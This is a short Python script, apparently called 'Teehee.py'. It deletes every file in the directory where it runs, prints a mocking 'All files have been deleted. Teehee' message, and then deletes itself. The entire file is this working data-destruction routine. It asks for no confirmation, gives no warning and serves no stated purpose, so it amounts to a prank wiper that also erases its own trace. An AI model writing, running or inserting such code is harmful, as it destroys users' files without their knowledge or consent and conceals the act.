import os

def delete_files():
    files = os.listdir()
    for file in files:
        if file != "Teehee.py":
            os.remove(file)
    print("All files have been deleted. Teehee")

if __name__ == "__main__":
    delete_files()
    os.remove(__file__)